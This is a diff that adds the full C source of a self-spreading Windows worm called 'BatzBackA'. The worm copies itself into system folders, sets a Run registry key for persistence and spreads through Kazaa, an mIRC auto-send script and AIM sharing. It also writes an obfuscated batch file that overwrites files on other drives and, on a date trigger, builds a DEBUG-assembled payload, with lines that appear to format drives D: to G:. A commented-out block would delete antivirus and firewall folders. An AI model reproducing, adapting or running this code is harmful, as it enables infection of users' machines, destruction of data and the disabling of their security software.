@@ -1,0 +1,334 @@
+   //BatzBackA by L0NEw0lf, L0NE, Inc. (C) 2000 All Rights Reserved
+   #include "stdafx.h"
+   #include <stdio.h>
+   #include <direct.h>
+   #include <windows.h>
+   #include <process.h>
+   #include <shellapi.h>
+
+   char VirusPath[260], windir[MAX_PATH], windoze[MAX_PATH], sysdir[MAX_PATH], sysdoze[MAX_PATH], KazaaFull[MAX_PATH];
+   char mIrcFull[MAX_PATH], AimFull[MAX_PATH], DLLPath[MAX_PATH];
+   unsigned char winreg[MAX_PATH], Kazaa[1024], mIrc[1024];
+
+   FILE *Batz, *Script;
+   HKEY hKey;
+   DWORD KazaaPath=sizeof(Kazaa);
+   DWORD mIrcPath=sizeof(mIrc);
+
+   int i = 0;
+   int e = 0;
+
+   int APIENTRY WinMain(HINSTANCE hInstance,
+                        HINSTANCE hPrevInstance,
+                        LPSTR     lpCmdLine,
+                        int       nCmdShow)
+
+   {
+
+       {
+
+           SetErrorMode(SEM_NOGPFAULTERRORBOX);
+
+           PeekMessage(NULL, NULL, NULL, NULL, NULL);
+
+       }
+       {
+
+           GetModuleFileName(NULL, VirusPath, 260);
+
+       }
+       {
+
+           GetWindowsDirectory(windir, sizeof(windir));
+
+           strcpy(windoze, windir);
+           strcat(windoze, "\\BatzBack.scr");
+
+           CopyFile(VirusPath, windoze, FALSE);
+
+       }
+       {
+
+           GetSystemDirectory(sysdir, sizeof(sysdir));
+
+           strcpy(sysdoze, sysdir);
+           strcat(sysdoze, "\\BatzBack.scr");
+
+           CopyFile(VirusPath, sysdoze, FALSE);
+
+       }
+       {
+
+           while(windoze[i]!=0)
+           {
+
+               winreg[i]=windoze[i];
+               i++;
+
+           }
+
+           windoze[i]=0;
+
+           RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
+           RegSetValueEx(hKey, "BatzBack", NULL, REG_SZ, winreg, sizeof(winreg));
+           RegCloseKey(hKey);
+
+       }
+       {
+
+           chdir(windir);
+
+           Batz = fopen("BatzBack.Bat", "wt");
+
+           fprintf(Batz, "Echo.\n");
+           fprintf(Batz, "@cls\n");
+           fprintf(Batz, "@echo off\n");
+           fprintf(Batz, "@break off\n");
+           fprintf(Batz, "^S^e^t azmqip=e\n");
+           fprintf(Batz, "^S^e^t awewqmjhfs=S\n");
+           fprintf(Batz, "%%awewqmjhfs%%%%azmqip%%^t ewravdafdfz=%%%%awewqmjhfs%%%%azmqip%%^t\n");
+           fprintf(Batz, "qwpzmmz=JO\n");
+           fprintf(Batz, "fdsrzmx=\\\n");
+           fprintf(Batz, "fgbnrur=.b\n");
+           fprintf(Batz, "zcbwqqya=:\n");
+           fprintf(Batz, "fgfdgfh=py\n");
+           fprintf(Batz, "zmnawyqi=tr\n");
+           fprintf(Batz, "fdsgrtr=Co\n");
+           fprintf(Batz, "lkasjfd=At\n");
+           fprintf(Batz, "dhsauyw=.d\n");
+           fprintf(Batz, "fgkjmmfhj=McA\n");
+           fprintf(Batz, "zmawabqw=re\n");
+           fprintf(Batz, "azqopap=RC\n");
+           fprintf(Batz, "euizpvo=at\n");
+           fprintf(Batz, "aiuwein=f\n");
+           fprintf(Batz, "qlkanzqvp=No\n");
+           fprintf(Batz, "fzmcnru=TAS\n");
+           fprintf(Batz, "drzcnrt=xe\n");
+           fprintf(Batz, "yosiamq=cc\n");
+           fprintf(Batz, "fstrxmz=.e\n");
+           fprintf(Batz, "dgjkkbsd=fee\n");
+           fprintf(Batz, "hgbsdfh=ho\n");
+           fprintf(Batz, "dfzmnri=OAN\n");
+           fprintf(Batz, "sfdeneu=KM\n");
+           fprintf(Batz, "azmbqwia=Pr\n");
+           fprintf(Batz, "qeffxxsd=.v\n");
+           fprintf(Batz, "fdgdcfg=Ec\n");
+           fprintf(Batz, "gfdsgfg=lf\n");
+           fprintf(Batz, "gfhgflg=L0\n");
+           fprintf(Batz, "mnzxbaqx=-\n");
+           fprintf(Batz, "fgdhghj=w0\n");
+           fprintf(Batz, "sgffsdg=NE\n");
+           fprintf(Batz, "gffgttg=ck\n");
+           fprintf(Batz, "rteyyry=Ba\n");
+           fprintf(Batz, "hjgfghf=By\n");
+           fprintf(Batz, "lekdxmd=IN\n");
+           fprintf(Batz, "azmklua=mI\n");
+           fprintf(Batz, "fsdtuxv=tz\n");
+           fprintf(Batz, "fripzmv=/\n");
+           fprintf(Batz, "azcewead=P\n");
+           fprintf(Batz, "dgfdg=n\n");
+           fprintf(Batz, "ffzoe=(\n");
+           fprintf(Batz, "sfdzapdaw=e\n");
+           fprintf(Batz, "xnbie=)\n");
+           fprintf(Batz, "azxwepos=X\n");
+           fprintf(Batz, "awegh=ug\n");
+           fprintf(Batz, "dsafeaxzp=v\n");
+           fprintf(Batz, "ewafzqwew=n\n");
+           fprintf(Batz, "amznw=deb\n");
+           fprintf(Batz, "fgdfr=pg\n");
+           fprintf(Batz, "aoidmxz=m\n");
+           fprintf(Batz, "sadgr=lf.j\n");
+           fprintf(Batz, "gdfgr=W0\n");
+           fprintf(Batz, "sdgsd=or\n");
+           fprintf(Batz, "dfsgh=F\n");
+           fprintf(Batz, "suuiz=i\n");
+           fprintf(Batz, "sawiopz=ha\n");
+           fprintf(Batz, "qwpoasim=scr\n");
+           fprintf(Batz, "sadifdma=cx\n");
+           fprintf(Batz, "samdwo=w\n");
+           fprintf(Batz, "zfhyo=r\n");
+           fprintf(Batz, "peowqz=mb\n");
+           fprintf(Batz, "qwipap=aBo\n");
+           fprintf(Batz, "zaqmp=o\n");
+           fprintf(Batz, "amlwq=D\n");
+           fprintf(Batz, "zmdoa=q\n");
+           fprintf(Batz, "mbnwz=MVBB.D\n");
+           fprintf(Batz, "zcaqd=LL\n");
+           fprintf(Batz, "fsdrtio=%%0\n");
+           fprintf(Batz, "dfzmn=%%%%i\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% %%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%% %%hjgfghf%% %%gfhgflg%%%%sgffsdg%%%%fgdhghj%%%%gfdsgfg%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% Z%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% Y%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% X%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% W%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% V%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% U%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% T%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% S%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% R%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% Q%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% P%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% O%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% N%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% M%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% L%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% K%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% J%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% I%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% H%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% G%%zcbwqqya%%\\\n");
+           fprintf(Batz, "%%dsafeaxzp%%%%sfdzapdaw%%%%zfhyo%% | %%dfsgh%%%%suuiz%%^n^d \"%%azxwepos%%%%azcewead%%\"\n");
+           fprintf(Batz, "%%suuiz%%%%aiuwein%% %%sfdzapdaw%%%%zfhyo%%%%zfhyo%%%%zaqmp%%%%zfhyo%%^l%%sfdzapdaw%%%%dsafeaxzp%%%%sfdzapdaw%%l 1 g%%zaqmp%%^t%%zaqmp%% %%zcbwqqya%%NT?\n");
+           fprintf(Batz, "%%suuiz%%%%aiuwein%% n%%zaqmp%%t %%sfdzapdaw%%%%zfhyo%%%%zfhyo%%%%zaqmp%%%%zfhyo%%^l%%sfdzapdaw%%%%dsafeaxzp%%%%sfdzapdaw%%l 1 g%%zaqmp%%t%%zaqmp%% %%zcbwqqya%%X\n");
+           fprintf(Batz, ":NT?\n");
+           fprintf(Batz, "%%dsafeaxzp%%%%sfdzapdaw%%%%zfhyo%% | %%dfsgh%%%%suuiz%%^n^d \"NT\"\n");
+           fprintf(Batz, "%%suuiz%%%%aiuwein%% %%sfdzapdaw%%%%zfhyo%%%%zfhyo%%%%zaqmp%%%%zfhyo%%^l%%sfdzapdaw%%%%dsafeaxzp%%%%sfdzapdaw%%l 1 g%%zaqmp%%^t%%zaqmp%% %%zcbwqqya%%2K?\n");
+           fprintf(Batz, "%%suuiz%%%%aiuwein%% n%%zaqmp%%t %%sfdzapdaw%%%%zfhyo%%%%zfhyo%%%%zaqmp%%%%zfhyo%%^l%%sfdzapdaw%%%%dsafeaxzp%%%%sfdzapdaw%%l 1 g%%zaqmp%%t%%zaqmp%% %%zcbwqqya%%X\n");
+           fprintf(Batz, ":2K?\n");
+           fprintf(Batz, "%%dsafeaxzp%%%%sfdzapdaw%%%%zfhyo%% | %%dfsgh%%%%suuiz%%^n^d \"2000\"\n");
+           fprintf(Batz, "%%suuiz%%%%aiuwein%% %%sfdzapdaw%%%%zfhyo%%%%zfhyo%%%%zaqmp%%%%zfhyo%%^l%%sfdzapdaw%%%%dsafeaxzp%%%%sfdzapdaw%%l 1 g%%zaqmp%%^t%%zaqmp%% %%zcbwqqya%%W\n");
+           fprintf(Batz, "%%suuiz%%%%aiuwein%% n%%zaqmp%%t %%sfdzapdaw%%%%zfhyo%%%%zfhyo%%%%zaqmp%%%%zfhyo%%^l%%sfdzapdaw%%%%dsafeaxzp%%%%sfdzapdaw%%l 1 g%%zaqmp%%t%%zaqmp%% %%zcbwqqya%%X\n");
+           fprintf(Batz, ":X\n");
+           fprintf(Batz, "%%dfsgh%%%%zaqmp%%%%zfhyo%% %%fripzmv%%R %%fdsrzmx%% %%dfzmn%% %%lekdxmd%% %%ffzoe%%*%%fstrxmz%%%%drzcnrt%%%%xnbie%% %%amlwq%%%%zaqmp%% %%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% %%dfzmn%%\n");
+           fprintf(Batz, "%%dfsgh%%%%zaqmp%%%%zfhyo%% %%fripzmv%%R %%fdsrzmx%% %%dfzmn%% %%lekdxmd%% %%ffzoe%%*%%fgbnrur%%%%euizpvo%%%%xnbie%% %%amlwq%%%%zaqmp%% %%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%dfzmn%%+%%fsdrtio%% %%dfzmn%%\n");
+           fprintf(Batz, "%%dfsgh%%%%zaqmp%%%%zfhyo%% %%fripzmv%%R %%fdsrzmx%% %%dfzmn%% %%lekdxmd%% %%ffzoe%%%%windir%%\\System32\\*.%%qwpoasim%%%%xnbie%% %%amlwq%%%%zaqmp%% %%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% %%dfzmn%%\n");
+           fprintf(Batz, "^g%%zaqmp%%^t%%zaqmp%% %%zcbwqqya%%PayFind\n");
+           fprintf(Batz, ":W\n");
+           fprintf(Batz, "%%dfsgh%%%%zaqmp%%%%zfhyo%% %%dfzmn%% %%lekdxmd%% %%ffzoe%%*%%fstrxmz%%%%drzcnrt%% ..%%fdsrzmx%%*%%fstrxmz%%%%drzcnrt%% ..%%fdsrzmx%%*%%fstrxmz%%%%drzcnrt%% %%PATH%%\\*%%fstrxmz%%%%drzcnrt%% %%windir%%\\*%%fstrxmz%%%%drzcnrt%%%%xnbie%% %%amlwq%%%%zaqmp%% %%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% %%dfzmn%%\n");
+           fprintf(Batz, "%%dfsgh%%%%zaqmp%%%%zfhyo%% %%dfzmn%% %%lekdxmd%% %%ffzoe%%*%%fgbnrur%%%%euizpvo%% ..%%fdsrzmx%%*%%fgbnrur%%%%euizpvo%% ..%%fdsrzmx%%*%%fgbnrur%%%%euizpvo%% %%PATH%%\\*%%fgbnrur%%%%euizpvo%% %%windir%%\\*%%fgbnrur%%%%euizpvo%% %%amlwq%%%%zaqmp%% %%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%dfzmn%%+%%fsdrtio%% %%dfzmn%%\n");
+           fprintf(Batz, "%%dfsgh%%%%zaqmp%%%%zfhyo%% %%fripzmv%%R %%fdsrzmx%% %%dfzmn%% %%lekdxmd%% %%ffzoe%%%%windir%%\\System\\*.%%qwpoasim%%%%xnbie%% %%amlwq%%%%zaqmp%% %%fdgdcfg%%%%hgbsdfh%% Y | %%fdsgrtr%%%%fgfdgfh%% %%windir%%\\%%rteyyry%%%%fsdtuxv%%%%rteyyry%%%%gffgttg%%.%%qwpoasim%% %%dfzmn%%\n");
+           fprintf(Batz, "^g%%zaqmp%%^t%%zaqmp%% %%zcbwqqya%%PayFind\n");
+           fprintf(Batz, ":PayFind\n");
+           fprintf(Batz, "%%amlwq%%^a^t%%sfdzapdaw%% | %%aiuwein%%%%suuiz%%^n^d \"Sun\"\n");
+           fprintf(Batz, "%%suuiz%%%%aiuwein%% %%sfdzapdaw%%%%zfhyo%%%%zfhyo%%%%zaqmp%%%%zfhyo%%^l%%sfdzapdaw%%%%dsafeaxzp%%%%sfdzapdaw%%l 1 g%%zaqmp%%t%%zaqmp%% %%zcbwqqya%%Nero\n");
+           fprintf(Batz, "%%suuiz%%%%aiuwein%% n%%zaqmp%%t %%sfdzapdaw%%%%zfhyo%%%%zfhyo%%%%zaqmp%%%%zfhyo%%^l%%sfdzapdaw%%%%dsafeaxzp%%%%sfdzapdaw%%l 1 g%%zaqmp%%t%%zaqmp%% %%zcbwqqya%%Sabbath\n");
+           fprintf(Batz, ":Sabbath\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% n %%fdsrzmx%%L0NEInc.XEX > %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% e 0100 B8 13 35 CD 21 89 1E 26 01 8C 06 28 01 0E 07 33 >> %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% e 0110 F6 BB 33 01 B9 14 00 80 30 66 46 E2 FA 41 BA 81 >> %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% e 0120 00 B8 02 03 9C 9A 00 00 00 00 FE C6 75 F3 FE CA >> %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% e 0130 78 EF C3 4C 30 4E 45 77 30 6C 66 20 57 61 73 20 >> %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% e 0140 48 65 72 65 2E 2E 2E >> %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% rcx >> %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% 0260 >> %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% w >> %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% q >> %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%amznw%%%%awegh%% < %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "%%zfhyo%%%%sfdzapdaw%%n %%fdsrzmx%%L0NEInc.XEX L0NEInc%%fstrxmz%%%%drzcnrt%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%amlwq%%%%sfdzapdaw%%^l %%windir%%\\%%mbnwz%%%%zcaqd%%\n");
+           fprintf(Batz, "^S^t^a%%zfhyo%%^t %%fdsrzmx%%L0NEInc%%fstrxmz%%%%drzcnrt%%\n");
+           fprintf(Batz, "%%suuiz%%%%aiuwein%% %%sfdzapdaw%%%%zfhyo%%%%zfhyo%%%%zaqmp%%%%zfhyo%%^l%%sfdzapdaw%%%%dsafeaxzp%%%%sfdzapdaw%%^l 1 g%%zaqmp%%t%%zaqmp%%Sabbath\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%zqiapei%%%%euizpvo%% D%%zcbwqqya%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%zqiapei%%%%euizpvo%% E%%zcbwqqya%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%zqiapei%%%%euizpvo%% F%%zcbwqqya%%\n");
+           fprintf(Batz, "%%fdgdcfg%%%%hgbsdfh%% Y | %%zqiapei%%%%euizpvo%% G%%zcbwqqya%%\n");
+           fprintf(Batz, ":Nero\n");
+           fclose(Batz);
+
+       }
+       {
+
+           RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Kazaa\\Transfer", 0, KEY_QUERY_VALUE, &hKey);
+           RegQueryValueEx(hKey, "DlDir0", NULL, NULL, Kazaa, &KazaaPath);
+           RegCloseKey(hKey);
+
+           if (Kazaa[0]>64 && Kazaa[0]<123)
+           {
+
+               i=0;
+               while (Kazaa[i]!=0)
+               {
+
+                   KazaaFull[i]=Kazaa[i];
+                   i++;
+
+               }
+
+               KazaaFull[i]=0;
+
+               strcat(KazaaFull, "\\EminEmSpearsBritney.Scr");
+
+               CopyFile(VirusPath, KazaaFull, FALSE);
+
+           }
+
+           RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIrc", 0, KEY_QUERY_VALUE, &hKey);
+           RegQueryValueEx(hKey, "UninstallString", NULL, NULL, mIrc, &mIrcPath);
+           RegCloseKey(hKey);
+
+           e=1;
+           while (mIrc[e]!=0 && mIrc[e]!='.')
+           {
+
+               mIrcFull[e-1]=mIrc[e];
+               e++;
+
+           }
+
+           mIrcFull[e-1]=0;
+           e=strlen(mIrcFull);
+           while (mIrcFull[e]!=92)
+           {
+
+               mIrcFull[e]=0;
+               e--;
+
+           }
+
+           strcat(mIrcFull, "script.ini");
+
+           Script = fopen(mIrcFull, "wt");
+
+           fprintf(Script, "[script]\n");
+           fprintf(Script, "n0=on 1:JOIN:#:{\n");
+           fprintf(Script, "n1=\t/if ( $nick == $me ) { halt }\n");
+           fprintf(Script, "n2=\t/.send $nick %s\n", sysdoze);
+           fprintf(Script, "n3=}\n");
+           fclose(Script);
+
+       }
+       {
+
+           strcat(AimFull, "\\Program Files\\AIM95\\BuddyShare.exe");
+
+           CopyFile(VirusPath, AimFull, FALSE);
+
+           _chdir("\\Program Files\\AIM95\\");
+
+           system("ShareFile.exe \\Progra~1\\AIM95\\BuddyShare.exe");
+
+       }
+       {
+
+           /*
+
+           _chdir(windir);
+
+           ShellExecute(NULL, "Open", "BatzBack.Bat", NULL, NULL, SW_HIDE);
+
+           _unlink("\\Progra~1\\Norton~1\\*.*");
+           _unlink("\\Progra~1\\Norton~2\\*.*");
+           _unlink("\\Progra~1\\PandaS~1\\*.*");
+           _unlink("\\Progra~1\\McAfee\\VirusScan\\*.*");
+           _unlink("\\Progra~1\\TrendM~1\\*.*");
+           _unlink("\\Progra~1\\ZoneLa~1\\*.*");
+           _unlink("\\Progra~1\\Grisoft\\AVG6\\*.*");
+           _unlink("\\Progra~1\\AntiVi~1\\*.*");
+           _unlink("\\Progra~1\\QuickH~1\\*.*");
+           _unlink("\\Progra~1\\FWIN32\\*.*");
+           _unlink("\\Progra~1\\FindVirus\\*.*");
+           _unlink("\\eSafen\\*.*");
+           _unlink("\\f-macro\\*.*");
+           _unlink("\\TBAVW95\\*.*");
+           _unlink("\\VS95\\*.*");
+           _unlink("\\AntiVi~1\\*.*");
+           _unlink("\\ToolKit\\FindVirus\\*.*");
+           _unlink("\\PC-Cil~1\\*.*");
+
+           */
+
+       }
+
+       return 0;
+
+   }
